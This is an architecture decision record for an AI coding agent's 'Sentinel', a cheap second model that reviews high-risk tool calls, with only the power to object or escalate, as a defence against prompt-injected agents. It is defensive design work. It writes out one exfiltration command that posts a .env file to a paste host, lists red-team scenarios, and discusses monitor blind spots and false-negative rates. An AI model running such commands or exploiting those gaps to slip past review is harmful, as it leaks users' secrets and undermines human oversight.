# 0015 — The Sentinel: an independent model reviews high-risk calls and can only object

- **Status:** Accepted (2026-10-03)
- **Deciders:** owner (design [agents-skills-tools.md](../design/agents-skills-tools.md) §9 and Q10 deferred "an LLM safety classifier"; the owner has now asked for it)
- **Related:** [ADR 0002](0002-guards-only-deny.md) (guards only deny), [ADR 0011](0011-approve-later-inbox.md) (the approve-later inbox), [ADR 0005](0005-browser-agent-safety-model.md) (browser commit gate), [ADR 0006](0006-credential-broker.md) (secrets by name)

## Context

The deterministic layers — effect classes, the taint rule, the Bash and
remote-command classifiers, approval cards, the browser commit gate — decide
by *what* a call is. They cannot tell *whether the user asked for it*:
`curl -d @.env https://paste.example` and `curl -X POST localhost:3000/api/users`
are the same pattern, and so are a deploy the user requested and one a
web page talked the agent into. At L3 (the default chat level) and L4
(unattended) most of these calls run without a person, which is where an
over-eager or prompt-injected agent does its damage.

The field has converged on a pattern for this: a second model, shown the
user's intent and the proposed action, reviewing each risky action before it
runs and failing closed. The design deferred it (§9: "a large, measured
system … 17% false negatives even there") pending evidence; the owner now
wants it, kept lean and cheap.

## Decision

1. **A deny-only guard, last in the chain** (`src/sentinel/index.ts`,
   stage `sentinel`, registered in `agent.ts` after the sandbox guard). It
   returns `abstain` or `deny` like every guard (ADR 0002): the reviewer's
   **allow means "no objection"** and the call continues to exactly where it
   would have been without a reviewer. Deny refuses it with the reviewer's
   reason. **Escalate** hands it to a person: the run's approval card
   (`approve`/`onPermissionRequest`), or at L4 the approve-later inbox for a
   custom tool (the only kind the inbox can replay, ADR 0011), else a refusal
   plus a notification. Being last means a call a deterministic stage refuses
   never costs a review; a call a person already approved in this dispatch
   (`ctx.state` `human-approved`, set by `custom-tool:approval`) is not
   reviewed again.
2. **Only high-risk calls are reviewed** (`sentinelTrigger`,
   `src/sentinel/policy.ts`): custom tools declared exec/external/destructive;
   MCP tools not known to read; the ops tools; Bash/Terminal commands that the
   existing classifiers flag (`classifyBashCommand` warn,
   `classifyRemoteCommand`), deploy/publish/push commands and commands that
   send data off the machine; the desktop browser's commit-looking clicks,
   `browser_login`, uploads and page script; any `{{secret:…}}` argument;
   writes to AICO's own configuration; and, after the session read untrusted
   content, any non-read-only command, a write outside the workspace, or a
   fetch whose query could carry data out. **Never** reads or ordinary edits
   in the workspace.
3. **Input** (`buildReviewInput`): the person's own messages in the session
   (`user/message` from a human, on the run context as `userRequests`, which
   delegated runs inherit from the root — a sub-agent is judged against the
   user's words, not its brief); the call with secrets redacted (vault values
   via the sink redactor, then `vault/scan` patterns and bearer tokens); the
   agent's text in that step, clipped and labelled as a claim; the last eight
   calls; which tools fed untrusted content, by name. Everything the agent or
   a page wrote passes `shared/injection-guard` and cannot close our tags.
   It never sees tool *results* — that is where injections live.
4. **Model** (`defaultSentinelModel`): `sentinel.model`, else a cheap model
   of a different make from the agent's when a key exists —
   `deepseek-v4-pro` with thinking off (`deepseek-v4-flash` when the agent
   already is `-pro`) — else the agent's own model. One call, `maxTokens` 400,
   JSON `{verdict, reason}`.
5. **Fail safe.** A timeout (default 25 s), a provider error, an unreadable
   reply or an invented verdict is `escalate`, never `allow`. With nobody to
   ask, escalate is a refusal.
6. **When** (`sentinelActive`): `mode: auto` (default) reviews at L3/L4 and in
   any unattended run; `always` also at L1/L2; `off` never. Per-agent
   `sentinel.agents.<name>: on|off`. **A project's settings may only tighten
   it** (`tightenOnlySentinel` in `loadSettings`): a repository cannot ship
   `mode: off`, a different model or a shorter timeout. Off in certification
   runs (they measure the agent without a safety net) and in runs whose
   provider is the injected test seam unless their settings name a sentinel.
7. **Audit**: one append-only line per review in
   `aicoHome()/sentinel/verdicts.jsonl` (verdict, outcome, effect, why,
   model, cost, latency, the call redacted and clipped), served read-only at
   `/api/system/sentinel/list` and shown in the desktop Activity page's
   Sentinel section with totals and cost.

## Evidence

`scripts/sentinel-eval.mjs` (paid, on request): ten red-team scenarios —
six that should be stopped (prompt-injected exfiltration via curl, an
unrequested deletion, a purchase the user did not ask for, an injected email
send, a force-push to main after "rebase", disabling AICO's safety settings)
and four legitimate requested actions (a helm deploy to the named release, a
requested push, a requested POST to a local API, a migration with a vault
credential). On 2026-10-03, `deepseek-v4-pro` with thinking off: precision
1.00, recall 1.00 over 3 × 10 runs, 0 false stops, mean 1.2 s, about $0.0003
per review uncached ($0.0001 cached); `deepseek-v4-flash`: the same result at
0.7 s and $0.00007. The scenarios are clear-cut and written by the prompt's
authors; they are a smoke test, not a measure of the false-negative rate on
subtle real traffic (see auto mode's 17% and the independent stress test's
far higher figure below).

## Consequences

- One extra model call per high-risk call at L3/L4 — typically a few per
  session, about a tenth of a cent each. Ordinary coding (reads, edits,
  tests, builds) costs nothing.
- An escalation at L3 is a second card only when the reviewer objects and no
  person has seen the call; at L1/L2 the reviewer is off by default because
  the person approves those calls anyway.
- A persuaded or injected reviewer cannot make anything worse than no
  reviewer: it has no allow to give. That is why the agent's stated reason
  may be shown at all (auto mode strips it).
- **Honest limits.** It is a model: it drifts and can be fooled; the
  deterministic layers remain the first line and the sandbox/OS remain the
  boundary. Unattended escalations of non-custom tools (Bash, MCP, ops) are
  refused rather than parked, because the inbox cannot replay them exactly.
  The browser trigger reads the action's arguments, not the page (the
  desktop's commit gate, which does read the element, still asks on top).

## Alternatives rejected

- **A reviewer that can approve** (skip a later ask). Would make a model a
  source of grants; ADR 0002 forbids it by type.
- **Reviewing every call.** METR's monitor adds ~85% cost per transcript;
  reviewing only the trigger list keeps ordinary work free.
- **A two-stage classifier** (fast filter + reasoning pass, as auto mode).
  More accurate at scale, but double the calls and complexity; revisit with
  real verdict data from the audit file.
- **Showing the reviewer tool results.** The injected text is in them;
  naming which sources were read is enough to raise suspicion.

## Sources

1. Anthropic, "How we built Claude Code auto mode" — transcript classifier sees user messages and tool calls, strips assistant prose and tool outputs; two stages; 0.4% FPR / 17% FNR on real traffic. https://www.anthropic.com/engineering/claude-code-auto-mode
2. "Measuring the Permission Gate: A Stress-Test Evaluation of Claude Code's Auto Mode" (arXiv 2604.04978) — end-to-end FNR far higher on deliberately ambiguous scenarios; in-project edits outside the classifier's scope. https://arxiv.org/html/2604.04978v2
3. METR, "Implementing and Evaluating a Basic Per-Action Monitor for Safer Evals" (2026-09-27) — per-action LLM monitor, escalate above a threshold to a human, fails closed; cost/latency overhead. https://metr.org/notes/2026-09-27-implementing-a-basic-blocking-action-monitor/
4. "AgentSpec: Customizable Runtime Enforcement for Safe and Reliable LLM Agents" (ICSE 2026) — evaluating proposed actions against constraints before execution. https://cposkitt.github.io/files/publications/agentspec_llm_enforcement_icse26.pdf
5. Greenblatt et al., "AI Control: Improving Safety Despite Intentional Subversion" (arXiv 2312.06942) — "trusted monitoring": a weaker, trusted model reviews a stronger model's actions and routes suspicious ones to humans.
